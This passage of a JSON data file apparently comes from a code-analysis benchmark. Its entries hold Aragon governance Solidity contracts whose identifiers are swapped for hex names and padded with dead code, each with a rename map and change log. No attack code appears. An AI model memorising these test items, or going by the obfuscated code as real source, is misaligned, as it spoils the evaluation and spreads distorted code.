_0xe7c88b, _0xce7679);\n        __LockToGovernBase_init(_0xce1cee);\n\n        emit MembershipContractAnnounced({_0xe9b5df: address(_0xce1cee._0x993380())});\n    }\n\n    /// @notice Checks if this or the parent contract supports an interface by its ID.\n    /// @param _interfaceId The ID of the interface.\n    /// @return Returns `true` if the interface is supported.\n    function _0xaa9a0c(bytes4 _0x350f81)\n        public\n        view\n        virtual\n        override(MajorityVotingBase, LockToGovernBase)\n        returns (bool)\n    {\n        if (false) { revert(); }\n        bool _flag4 = false;\n        return _0x350f81 == LOCK_TO_VOTE_INTERFACE_ID || _0x350f81 == type(ILockToVote)._0x522c67\n            || super._0xaa9a0c(_0x350f81);\n    }\n\n    /// @inheritdoc IProposal\n    function _0xfed3a0() external pure override returns (string memory) {\n        return \"(uint256 allowFailureMap)\";\n    }\n\n    /// @inheritdoc IProposal\n    /// @dev Requires the `CREATE_PROPOSAL_PERMISSION_ID` permission.\n    function _0x11a90f(\n        bytes calldata _0xa8e480,\n        Action[] memory _0x8c179a,\n        uint64 _0x4fa48e,\n        uint64 _0xe34961,\n        bytes memory _0xe0a76d\n    ) external _0x7528e9(CREATE_PROPOSAL_PERMISSION_ID) returns (uint256 _0x1a88a9) {\n        uint256 _0x427c90;\n\n        if (_0xe0a76d.length != 0) {\n            (_0x427c90) = abi._0xa9aa97(_0xe0a76d, (uint256));\n        }\n\n        if (_0xfe162d() == 0) {\n            revert NoVotingPower();\n        }\n\n        /// @dev `minProposerVotingPower` is checked at the the permission condition behind auth(CREATE_PROPOSAL_PERMISSION_ID)\n\n        (_0x4fa48e, _0xe34961) = _0x367d9d(_0x4fa48e, _0xe34961);\n\n        _0x1a88a9 = _0xc0c3bd(_0xbc8a32(abi._0x231e58(_0x8c179a, _0xa8e480)));\n\n        if (_0xa16337(_0x1a88a9)) {\n            revert ProposalAlreadyExists(_0x1a88a9);\n        }\n\n        // Store proposal related information\n        Proposal storage _0x43a028 = _0x10d72a[_0x1a88a9];\n\n        _0x43a028._0x57b49c._0xb775da = _0xb775da();\n        _0x43a028._0x57b49c._0xd7b8aa = _0xd7b8aa();\n        _0x43a028._0x57b49c._0xe4f0f3 = _0x4fa48e;\n        _0x43a028._0x57b49c._0xba8791 = _0xe34961;\n        _0x43a028._0x57b49c._0xe85bd8 = _0xe85bd8();\n        _0x43a028._0x57b49c._0x5015f6 = _0x5015f6();\n\n        _0x43a028._0x4720aa = _0xd2e98e();\n\n        // Reduce costs\n        if (_0x427c90 != 0) {\n            _0x43a028._0x5f4032 = _0x427c90;\n        }\n\n        for (uint256 i; i < _0x8c179a.length;) {\n            _0x43a028._0x30b086.push(_0x8c179a[i]);\n            unchecked {\n                ++i;\n            }\n        }\n\n        emit ProposalCreated(_0x1a88a9, _0xea3940(), _0x4fa48e, _0xe34961, _0xa8e480, _0x8c179a, _0x427c90);\n\n        _0x42ab8a._0x4d355d(_0x1a88a9);\n    }\n\n    /// @inheritdoc ILockToVote\n    /// @dev Reverts if the proposal with the given `_proposalId` does not exist.\n    function _0xe08386(uint256 _0x4addd3, address _0x7ad04c, VoteOption _0x38a4ea) public view returns (bool) {\n        if (!_0xa16337(_0x4addd3)) {\n            revert NonexistentProposal(_0x4addd3);\n        }\n\n        Proposal storage _0x43a028 = _0x10d72a[_0x4addd3];\n        return _0xfd8513(_0x43a028, _0x7ad04c, _0x38a4ea, _0x42ab8a._0x09d1ac(_0x7ad04c));\n    }\n\n    /// @inheritdoc ILockToVote\n    function _0xd3d31c(uint256 _0x4addd3, address _0x7ad04c, VoteOption _0x38a4ea, uint256 _0xfff758)\n        public\n        override\n        _0x7528e9(LOCK_MANAGER_PERMISSION_ID)\n    {\n        Proposal storage _0x43a028 = _0x10d72a[_0x4addd3];\n\n        if (!_0xfd8513(_0x43a028, _0x7ad04c, _0x38a4ea, _0xfff758)) {\n            revert VoteCastForbidden(_0x4addd3, _0x7ad04c);\n        }\n\n        // Same vote\n        if (_0x38a4ea == _0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f) {\n            // Same value, nothing to do\n            if (_0xfff758 == _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6) return;\n\n            // More balance\n            /// @dev diff > 0 is guaranteed, as _canVote() above will return false and revert otherwise\n            uint256 _0x85b65d = _0xfff758 - _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6;\n            _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6 = _0xfff758;\n\n            if (_0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f == VoteOption.Yes) {\n                _0x43a028._0xc38d33._0x90360c += _0x85b65d;\n            } else if (_0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f == VoteOption.No) {\n                _0x43a028._0xc38d33._0x23c8f8 += _0x85b65d;\n            } else {\n                /// @dev Voting none is not possible, as _canVote() above will return false and revert if so\n                _0x43a028._0xc38d33._0x392ce6 += _0x85b65d;\n            }\n        } else {\n            /// @dev VoteReplacement has already been enforced by _canVote()\n\n            // Was there a vote?\n            if (_0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6 > 0) {\n                // Undo that vote\n                if (_0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f == VoteOption.Yes) {\n                    _0x43a028._0xc38d33._0x90360c -= _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6;\n                } else if (_0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f == VoteOption.No) {\n                    _0x43a028._0xc38d33._0x23c8f8 -= _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6;\n                } else {\n                    /// @dev Voting none is not possible, only abstain is left\n                    _0x43a028._0xc38d33._0x392ce6 -= _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6;\n                }\n            }\n\n            // Register the new vote\n            if (_0x38a4ea == VoteOption.Yes) {\n                _0x43a028._0xc38d33._0x90360c += _0xfff758;\n            } else if (_0x38a4ea == VoteOption.No) {\n                _0x43a028._0xc38d33._0x23c8f8 += _0xfff758;\n            } else {\n                /// @dev Voting none is not possible, only abstain is left\n                _0x43a028._0xc38d33._0x392ce6 += _0xfff758;\n            }\n            _0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f = _0x38a4ea;\n            _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6 = _0xfff758;\n        }\n\n        emit VoteCast(_0x4addd3, _0x7ad04c, _0x38a4ea, _0xfff758);\n\n        if (_0x43a028._0x57b49c._0xb775da == VotingMode.EarlyExecution) {\n            _0xd30652(_0x4addd3, _0xea3940());\n        }\n    }\n\n    /// @inheritdoc ILockToVote\n    function _0x5beb71(uint256 _0x4addd3, address _0x7ad04c) external _0x7528e9(LOCK_MANAGER_PERMISSION_ID) {\n        Proposal storage _0x43a028 = _0x10d72a[_0x4addd3];\n        if (!_0x46fbcc(_0x43a028)) {\n            revert VoteRemovalForbidden(_0x4addd3, _0x7ad04c);\n        } else if (_0x43a028._0x57b49c._0xb775da != VotingMode.VoteReplacement) {\n            revert VoteRemovalForbidden(_0x4addd3, _0x7ad04c);\n        } else if (_0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6 == 0) {\n            // Nothing to do\n            return;\n        }\n\n        // Undo that vote\n        if (_0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f == VoteOption.Yes) {\n            _0x43a028._0xc38d33._0x90360c -= _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6;\n        } else if (_0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f == VoteOption.No) {\n            _0x43a028._0xc38d33._0x23c8f8 -= _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6;\n        }\n        /// @dev Double checking for abstain, even though canVote prevents any other voteOption value\n        else if (_0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f == VoteOption.Abstain) {\n            _0x43a028._0xc38d33._0x392ce6 -= _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6;\n        }\n        _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6 = 0;\n\n        emit VoteCleared(_0x4addd3, _0x7ad04c);\n    }\n\n    /// @inheritdoc ILockToGovernBase\n    function _0x05742c(uint256 _0x4addd3) external view returns (bool) {\n        Proposal storage _0x43a028 = _0x10d72a[_0x4addd3];\n        return _0x46fbcc(_0x43a028);\n    }\n\n    /// @inheritdoc MajorityVotingBase\n    function _0xd76d33() public view override(ILockToGovernBase, MajorityVotingBase) returns (uint256) {\n        return MajorityVotingBase._0xd76d33();\n    }\n\n    /// @inheritdoc MajorityVotingBase\n    function _0xfe162d() public view override returns (uint256) {\n        return IERC20(_0x42ab8a._0x993380())._0x764f19();\n    }\n\n    /// @inheritdoc ILockToGovernBase\n    function _0x12de40(uint256 _0x4addd3, address _0x7ad04c) public view returns (uint256) {\n        return _0x10d72a[_0x4addd3]._0x2b6fd0[_0x7ad04c]._0x0acdf6;\n    }\n\n    // Internal helpers\n\n    function _0xfd8513(Proposal storage _0x43a028, address _0x7ad04c, VoteOption _0x38a4ea, uint256 _0xfff758)\n        internal\n        view\n        returns (bool)\n    {\n        uint256 _0xb5b0b9 = _0x43a028._0x2b6fd0[_0x7ad04c]._0x0acdf6;\n\n        // The proposal vote hasn't started or has already ended.\n        if (!_0x46fbcc(_0x43a028)) {\n            return false;\n        } else if (_0x38a4ea == VoteOption.None) {\n            return false;\n        }\n        // Standard voting + early execution\n        else if (_0x43a028._0x57b49c._0xb775da != VotingMode.VoteReplacement) {\n            // Lowering the existing voting power (or the same) is not allowed\n            if (_0xfff758 <= _0xb5b0b9) {\n                return false;\n            }\n            // The voter already voted a different option but vote replacment is not allowed.\n            else if (\n                _0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f != VoteOption.None\n                    && _0x38a4ea != _0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f\n            ) {\n                return false;\n            }\n        }\n        // Vote replacement mode\n        else {\n            // Lowering the existing voting power is not allowed\n            if (_0xfff758 == 0 || _0xfff758 < _0xb5b0b9) {\n                return false;\n            }\n            // Voting the same option with the same balance is not allowed\n            else if (_0xfff758 == _0xb5b0b9 && _0x38a4ea == _0x43a028._0x2b6fd0[_0x7ad04c]._0x3a334f) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n\n    function _0xd30652(uint256 _0x4addd3, address _0x8f84ad) internal {\n        if (!_0x61d424(_0x4addd3)) {\n            return;\n        } else if (!_0x05d778()._0x41916e(address(this), _0x8f84ad, EXECUTE_PROPOSAL_PERMISSION_ID, _0xd6e796())) {\n            return;\n        }\n\n        _0xdfc38e(_0x4addd3);\n    }\n\n    function _0xdfc38e(uint256 _0x4addd3) internal override {\n        super._0xdfc38e(_0x4addd3);\n\n        // Notify the LockManager to stop tracking this proposal ID\n        _0x42ab8a._0xcb6c30(_0x4addd3);\n    }\n\n    /// @notice This empty reserved space is put in place to allow future versions to add\n    /// new variables without shifting down storage in the inheritance chain\n    /// (see [OpenZeppelin's guide about storage gaps]\n    /// (https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps)).\n    uint256[50] private __gap;\n}\n",
      "rename_map": {
        "onlyCallAtInitialization": "_0x67b3f6",
        "customProposalParamsABI": "_0xfed3a0",
        "minProposerVotingPower": "_0xd76d33",
        "_attemptEarlyExecution": "_0xd30652",
        "_validateProposalDates": "_0x367d9d",
        "supportThresholdRatio": "_0xd7b8aa",
        "minParticipationRatio": "_0xe85bd8",
        "_currentVotingPower": "_0xb5b0b9",
        "currentTokenSupply": "_0xfe162d",
        "_createProposalId": "_0xc0c3bd",
        "supportsInterface": "_0xaa9a0c",
        "definingContract": "_0xe9b5df",
        "minApprovalRatio": "_0x5015f6",
        "_allowFailureMap": "_0x427c90",
        "getLockedBalance": "_0x09d1ac",
        "_votingSettings": "_0xadeb8f",
        "_proposalExists": "_0xa16337",
        "_newVotingPower": "_0xfff758",
        "getTargetConfig": "_0xd2e98e",
        "usedVotingPower": "_0x12de40",
        "_isProposalOpen": "_0x46fbcc",
        "proposalCreated": "_0x4d355d",
        "_pluginMetadata": "_0xce7679",
        "allowFailureMap": "_0x5f4032",
        "isProposalOpen": "_0x05742c",
        "createProposal": "_0x11a90f",
        "proposalEnded": "_0xcb6c30",
        "_targetConfig": "_0xe7c88b",
        "hasPermission": "_0x41916e",
        "reinitializer": "_0x37be0a",
        "_lockManager": "_0xce1cee",
        "_interfaceId": "_0x350f81",
        "targetConfig": "_0x4720aa",
        "_canExecute": "_0x61d424",
        "_voteCaller": "_0x8f84ad",
        "_proposalId": "_0x4addd3",
        "interfaceId": "_0x522c67",
        "_voteOption": "_0x38a4ea",
        "totalSupply": "_0x764f19",
        "lockManager": "_0x42ab8a",
        "votingPower": "_0x0acdf6",
        "proposalId": "_0x1a88a9",
        "parameters": "_0x57b49c",
        "voteOption": "_0x3a334f",
        "votingMode": "_0xb775da",
        "_msgSender": "_0xea3940",
        "_startDate": "_0x4fa48e",
        "initialize": "_0x77d04a",
        "proposals": "_0x10d72a",
        "startDate": "_0xe4f0f3",
        "_metadata": "_0xa8e480",
        "proposal_": "_0x43a028",
        "clearVote": "_0x5beb71",
        "keccak256": "_0xbc8a32",
        "_canVote": "_0xfd8513",
        "_execute": "_0xdfc38e",
        "_endDate": "_0xe34961",
        "_msgData": "_0xd6e796",
        "_actions": "_0x8c179a",
        "abstain": "_0x392ce6",
        "actions": "_0x30b086",
        "canVote": "_0xe08386",
        "endDate": "_0xba8791",
        "decode": "_0xa9aa97",
        "encode": "_0x231e58",
        "_voter": "_0x7ad04c",
        "tally": "_0xc38d33",
        "voter": "_0x8b08c6",
        "token": "_0x993380",
        "votes": "_0x2b6fd0",
        "_data": "_0xe0a76d",
        "diff": "_0x85b65d",
        "auth": "_0x7528e9",
        "vote": "_0xd3d31c",
        "_dao": "_0xfa7867",
        "yes": "_0x90360c",
        "dao": "_0x05d778",
        "no": "_0x23c8f8"
      },
      "changes": [
        "Renamed 78 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_017",
      "transformed_id": "ss_l4_medium_sn_gs_017",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: AGPL-3.0-or-later\n\npragma solidity ^0.8.8;\n\nimport {ILockToGovernBase} from \"../interfaces/ILockToGovernBase.sol\";\nimport {ILockManager} from \"../interfaces/ILockManager.sol\";\n\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IPermissionCondition} from \"@aragon/osx-commons-contracts/src/permission/condition/IPermissionCondition.sol\";\nimport {PermissionCondition} from \"@aragon/osx-commons-contracts/src/permission/condition/PermissionCondition.sol\";\n\n/// @title MinVotingPowerCondition\n/// @author Aragon X - 2024\n/// @notice Checks if an account's voting power or token balance meets the threshold defined on the given plugin.\n/// @custom:security-contact sirt@aragon.org\ncontract MinVotingPowerCondition is PermissionCondition {\n    /// @notice The address of the `ILockToGovernBase` plugin used to fetch the settings from.\n    ILockToGovernBase public immutable _0x79d369;\n\n    /// @notice The address of the LockManager used by the plugin.\n    ILockManager public immutable _0x0cce95;\n\n    /// @notice The `IERC20` token interface used to check token balance.\n    IERC20 public immutable _0xa6ce69;\n\n    /// @notice Initializes the contract with the `ILockToGovernBase` plugin address and caches the associated token.\n    /// @param _plugin The address of the `ILockToGovernBase` plugin.\n    constructor(ILockToGovernBase _0xa0809a) {\n        _0x79d369 = _0xa0809a;\n        _0xa6ce69 = _0x79d369._0xa6ce69();\n        _0x0cce95 = _0x79d369._0x0cce95();\n    }\n\n    /// @inheritdoc IPermissionCondition\n    /// @dev The function checks both the voting power and token balance to ensure `_who` meets the minimum voting\n    ///      threshold defined in the `TokenVoting` plugin. Returns `false` if the minimum requirement is unmet.\n    function _0xb6d133(address _0x92640e, address _0x8898ce, bytes32 _0x7ae56b, bytes calldata _0x0bd032)\n        public\n        view\n        override\n        returns (bool)\n    {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n        (_0x92640e, _0x0bd032, _0x7ae56b);\n\n        uint256 _0x37d655 = _0xa6ce69._0x655fc2(_0x8898ce) + _0x0cce95._0xf4bfdd(_0x8898ce);\n        uint256 _0xf35eb2 = _0x79d369._0xc1363d();\n\n        return _0x37d655 >= _0xf35eb2;\n    }\n}\n",
      "rename_map": {
        "_minProposerVotingPower": "_0xf35eb2",
        "minProposerVotingPower": "_0xc1363d",
        "getLockedBalance": "_0xf4bfdd",
        "_currentBalance": "_0x37d655",
        "_permissionId": "_0x7ae56b",
        "lockManager": "_0x0cce95",
        "isGranted": "_0xb6d133",
        "balanceOf": "_0x655fc2",
        "_plugin": "_0xa0809a",
        "plugin": "_0x79d369",
        "_where": "_0x92640e",
        "token": "_0xa6ce69",
        "_data": "_0x0bd032",
        "_who": "_0x8898ce"
      },
      "changes": [
        "Renamed 14 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_018",
      "transformed_id": "ss_l4_medium_sn_gs_018",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: AGPL-3.0-or-later\npragma solidity ^0.8.13;\n\nimport {ILockManager} from \"./interfaces/ILockManager.sol\";\nimport {LockToGovernBase} from \"./base/LockToGovernBase.sol\";\nimport {ILockToVote} from \"./interfaces/ILockToVote.sol\";\nimport {IDAO} from \"@aragon/osx-commons-contracts/src/dao/IDAO.sol\";\nimport {Action} from \"@aragon/osx-commons-contracts/src/executors/IExecutor.sol\";\nimport {IPlugin} from \"@aragon/osx-commons-contracts/src/plugin/IPlugin.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IProposal} from \"@aragon/osx-commons-contracts/src/plugin/extensions/proposal/IProposal.sol\";\nimport {ERC165Upgradeable} from \"@openzeppelin/contracts-upgradeable/utils/introspection/ERC165Upgradeable.sol\";\nimport {SafeCastUpgradeable} from \"@openzeppelin/contracts-upgradeable/utils/math/SafeCastUpgradeable.sol\";\nimport {MajorityVotingBase} from \"./base/MajorityVotingBase.sol\";\nimport {ILockToGovernBase} from \"./interfaces/ILockToGovernBase.sol\";\n\ncontract LockToVotePlugin is ILockToVote, MajorityVotingBase, LockToGovernBase {\n    using SafeCastUpgradeable for uint256;\n\n    /// @notice The [ERC-165](https://eips.ethereum.org/EIPS/eip-165) interface ID of the contract.\n    bytes4 internal constant LOCK_TO_VOTE_INTERFACE_ID =\n        this._0x5774f3.selector ^ this._0xd38687.selector;\n\n    /// @notice The ID of the permission required to call the `createProposal` functions.\n    bytes32 public constant CREATE_PROPOSAL_PERMISSION_ID = _0xdc56a8(\"CREATE_PROPOSAL_PERMISSION\");\n\n    /// @notice The ID of the permission required to call `vote` and `clearVote`.\n    bytes32 public constant LOCK_MANAGER_PERMISSION_ID = _0xdc56a8(\"LOCK_MANAGER_PERMISSION\");\n\n    event VoteCleared(uint256 _0x19fbf7, address _0xa7c3a7);\n\n    error VoteRemovalForbidden(uint256 _0x19fbf7, address _0xa7c3a7);\n\n    /// @notice Initializes the component.\n    /// @dev This method is required to support [ERC-1822](https://eips.ethereum.org/EIPS/eip-1822).\n    /// @param _dao The IDAO interface of the associated DAO.\n    /// @param _votingSettings The voting settings.\n    /// @param _targetConfig Configuration for the execution target, specifying the target address and operation type\n    ///     (either `Call` or `DelegateCall`). Defined by `TargetConfig` in the `IPlugin` interface,\n    ///     part of the `osx-commons-contracts` package, added in build 3.\n    /// @param _pluginMetadata The plugin specific information encoded in bytes.\n    ///     This can also be an ipfs cid encoded in bytes.\n    function _0xd9d971(\n        IDAO _0x080646,\n        ILockManager _0x8da029,\n        VotingSettings calldata _0x6722fc,\n        IPlugin.TargetConfig calldata _0x961199,\n        bytes calldata _0x726c70\n    ) external _0x8d2f91 _0xfb7e51(1) {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        __MajorityVotingBase_init(_0x080646, _0x6722fc, _0x961199, _0x726c70);\n        __LockToGovernBase_init(_0x8da029);\n\n        emit MembershipContractAnnounced({_0x8b1def: address(_0x8da029._0xa9e908())});\n    }\n\n    /// @notice Checks if this or the parent contract supports an interface by its ID.\n    /// @param _interfaceId The ID of the interface.\n    /// @return Returns `true` if the interface is supported.\n    function _0xd36c86(bytes4 _0x587156)\n        public\n        view\n        virtual\n        override(MajorityVotingBase, LockToGovernBase)\n        returns (bool)\n    {\n        bool _flag3 = false;\n        bool _flag4 = false;\n        return _0x587156 == LOCK_TO_VOTE_INTERFACE_ID || _0x587156 == type(ILockToVote)._0x90c273\n            || super._0xd36c86(_0x587156);\n    }\n\n    /// @inheritdoc IProposal\n    function _0xd8701a() external pure override returns (string memory) {\n        return \"(uint256 allowFailureMap)\";\n    }\n\n    /// @inheritdoc IProposal\n    /// @dev Requires the `CREATE_PROPOSAL_PERMISSION_ID` permission.\n    function _0xd38687(\n        bytes calldata _0xbac8f5,\n        Action[] memory _0xf27e27,\n        uint64 _0x7dbd1a,\n        uint64 _0xc7d879,\n        bytes memory _0xe8461d\n    ) external _0x20505a(CREATE_PROPOSAL_PERMISSION_ID) returns (uint256 _0x19fbf7) {\n        uint256 _0x96aaac;\n\n        if (_0xe8461d.length != 0) {\n            (_0x96aaac) = abi._0xf1d42b(_0xe8461d, (uint256));\n        }\n\n        if (_0xc7a3d6() == 0) {\n            revert NoVotingPower();\n        }\n\n        /// @dev `minProposerVotingPower` is checked at the the permission condition behind auth(CREATE_PROPOSAL_PERMISSION_ID)\n\n        (_0x7dbd1a, _0xc7d879) = _0xda7573(_0x7dbd1a, _0xc7d879);\n\n        _0x19fbf7 = _0x2112c6(_0xdc56a8(abi._0x913bd1(_0xf27e27, _0xbac8f5)));\n\n        if (_0x7c0ddb(_0x19fbf7)) {\n            revert ProposalAlreadyExists(_0x19fbf7);\n        }\n\n        // Store proposal related information\n        Proposal storage _0x0a81e2 = _0x83ae78[_0x19fbf7];\n\n        _0x0a81e2._0x90b24f._0xf3849c = _0xf3849c();\n        _0x0a81e2._0x90b24f._0x3f3404 = _0x3f3404();\n        _0x0a81e2._0x90b24f._0xefd224 = _0x7dbd1a;\n        _0x0a81e2._0x90b24f._0x4349b5 = _0xc7d879;\n        _0x0a81e2._0x90b24f._0xf3263f = _0xf3263f();\n        _0x0a81e2._0x90b24f._0xe91abe = _0xe91abe();\n\n        _0x0a81e2._0x230818 = _0xbd910c();\n\n        // Reduce costs\n        if (_0x96aaac != 0) {\n            _0x0a81e2._0x8df0ba = _0x96aaac;\n        }\n\n        for (uint256 i; i < _0xf27e27.length;) {\n            _0x0a81e2._0x8bdcec.push(_0xf27e27[i]);\n            unchecked {\n                ++i;\n            }\n        }\n\n        emit ProposalCreated(_0x19fbf7, _0x94ca1b(), _0x7dbd1a, _0xc7d879, _0xbac8f5, _0xf27e27, _0x96aaac);\n\n        _0xff69d3._0x4a0bc9(_0x19fbf7);\n    }\n\n    /// @inheritdoc ILockToVote\n    /// @dev Reverts if the proposal with the given `_proposalId` does not exist.\n    function _0xb2ec59(uint256 _0x44e96c, address _0xae3fcb, VoteOption _0x16bd0a) public view returns (bool) {\n        if (!_0x7c0ddb(_0x44e96c)) {\n            revert NonexistentProposal(_0x44e96c);\n        }\n\n        Proposal storage _0x0a81e2 = _0x83ae78[_0x44e96c];\n        return _0x57b7ea(_0x0a81e2, _0xae3fcb, _0x16bd0a, _0xff69d3._0xde5e8e(_0xae3fcb));\n    }\n\n    /// @inheritdoc ILockToVote\n    function _0x49ed41(uint256 _0x44e96c, address _0xae3fcb, VoteOption _0x16bd0a, uint256 _0x8a0930)\n        public\n        override\n        _0x20505a(LOCK_MANAGER_PERMISSION_ID)\n    {\n        Proposal storage _0x0a81e2 = _0x83ae78[_0x44e96c];\n\n        if (!_0x57b7ea(_0x0a81e2, _0xae3fcb, _0x16bd0a, _0x8a0930)) {\n            revert VoteCastForbidden(_0x44e96c, _0xae3fcb);\n        }\n\n        // Same vote\n        if (_0x16bd0a == _0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3) {\n            // Same value, nothing to do\n            if (_0x8a0930 == _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743) return;\n\n            // More balance\n            /// @dev diff > 0 is guaranteed, as _canVote() above will return false and revert otherwise\n            uint256 _0xe71137 = _0x8a0930 - _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743;\n            _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743 = _0x8a0930;\n\n            if (_0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3 == VoteOption.Yes) {\n                _0x0a81e2._0xc4b6ad._0x4848c9 += _0xe71137;\n            } else if (_0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3 == VoteOption.No) {\n                _0x0a81e2._0xc4b6ad._0x7ef10c += _0xe71137;\n            } else {\n                /// @dev Voting none is not possible, as _canVote() above will return false and revert if so\n                _0x0a81e2._0xc4b6ad._0x8cbc2e += _0xe71137;\n            }\n        } else {\n            /// @dev VoteReplacement has already been enforced by _canVote()\n\n            // Was there a vote?\n            if (_0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743 > 0) {\n                // Undo that vote\n                if (_0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3 == VoteOption.Yes) {\n                    _0x0a81e2._0xc4b6ad._0x4848c9 -= _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743;\n                } else if (_0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3 == VoteOption.No) {\n                    _0x0a81e2._0xc4b6ad._0x7ef10c -= _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743;\n                } else {\n                    /// @dev Voting none is not possible, only abstain is left\n                    _0x0a81e2._0xc4b6ad._0x8cbc2e -= _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743;\n                }\n            }\n\n            // Register the new vote\n            if (_0x16bd0a == VoteOption.Yes) {\n                _0x0a81e2._0xc4b6ad._0x4848c9 += _0x8a0930;\n            } else if (_0x16bd0a == VoteOption.No) {\n                _0x0a81e2._0xc4b6ad._0x7ef10c += _0x8a0930;\n            } else {\n                /// @dev Voting none is not possible, only abstain is left\n                _0x0a81e2._0xc4b6ad._0x8cbc2e += _0x8a0930;\n            }\n            _0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3 = _0x16bd0a;\n            _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743 = _0x8a0930;\n        }\n\n        emit VoteCast(_0x44e96c, _0xae3fcb, _0x16bd0a, _0x8a0930);\n\n        if (_0x0a81e2._0x90b24f._0xf3849c == VotingMode.EarlyExecution) {\n            _0x7545fa(_0x44e96c, _0x94ca1b());\n        }\n    }\n\n    /// @inheritdoc ILockToVote\n    function _0x715d8c(uint256 _0x44e96c, address _0xae3fcb) external _0x20505a(LOCK_MANAGER_PERMISSION_ID) {\n        Proposal storage _0x0a81e2 = _0x83ae78[_0x44e96c];\n        if (!_0x4f9109(_0x0a81e2)) {\n            revert VoteRemovalForbidden(_0x44e96c, _0xae3fcb);\n        } else if (_0x0a81e2._0x90b24f._0xf3849c != VotingMode.VoteReplacement) {\n            revert VoteRemovalForbidden(_0x44e96c, _0xae3fcb);\n        } else if (_0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743 == 0) {\n            // Nothing to do\n            return;\n        }\n\n        // Undo that vote\n        if (_0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3 == VoteOption.Yes) {\n            _0x0a81e2._0xc4b6ad._0x4848c9 -= _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743;\n        } else if (_0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3 == VoteOption.No) {\n            _0x0a81e2._0xc4b6ad._0x7ef10c -= _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743;\n        }\n        /// @dev Double checking for abstain, even though canVote prevents any other voteOption value\n        else if (_0x0a81e2._0x5c66fb[_0xae3fcb]._0x34e9b3 == VoteOption.Abstain) {\n            _0x0a81e2._0xc4b6ad._0x8cbc2e -= _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743;\n        }\n        _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743 = 0;\n\n        emit VoteCleared(_0x44e96c, _0xae3fcb);\n    }\n\n    /// @inheritdoc ILockToGovernBase\n    function _0xba7733(uint256 _0x44e96c) external view returns (bool) {\n        Proposal storage _0x0a81e2 = _0x83ae78[_0x44e96c];\n        return _0x4f9109(_0x0a81e2);\n    }\n\n    /// @inheritdoc MajorityVotingBase\n    function _0x5774f3() public view override(ILockToGovernBase, MajorityVotingBase) returns (uint256) {\n        return MajorityVotingBase._0x5774f3();\n    }\n\n    /// @inheritdoc MajorityVotingBase\n    function _0xc7a3d6() public view override returns (uint256) {\n        return IERC20(_0xff69d3._0xa9e908())._0x008020();\n    }\n\n    /// @inheritdoc ILockToGovernBase\n    function _0x68870f(uint256 _0x44e96c, address _0xae3fcb) public view returns (uint256) {\n        return _0x83ae78[_0x44e96c]._0x5c66fb[_0xae3fcb]._0x25f743;\n    }\n\n    // Internal helpers\n\n    function _0x57b7ea(Proposal storage _0x0a81e2, address _0xae3fcb, VoteOption _0x16bd0a, uint256 _0x8a0930)\n        internal\n        view\n        returns (bool)\n    {\n        uint256 _0xe35e9d = _0x0a81e2._0x5c66fb[_0xae3fcb]._0x25f743;\n\n        // The proposal vote hasn't started or has already ended.\n        if (!_0x4f9109(_0x0a81e2)) {\n            return false;\n        } else if (_0x16bd0a == VoteOption.None) {\n            return false;\n        }\n        // Standard voting + early execution\n        else if (_0x0a81e2._0x90b24f._0xf3849c != VotingMode.VoteReplacement) {\n            // Lowering 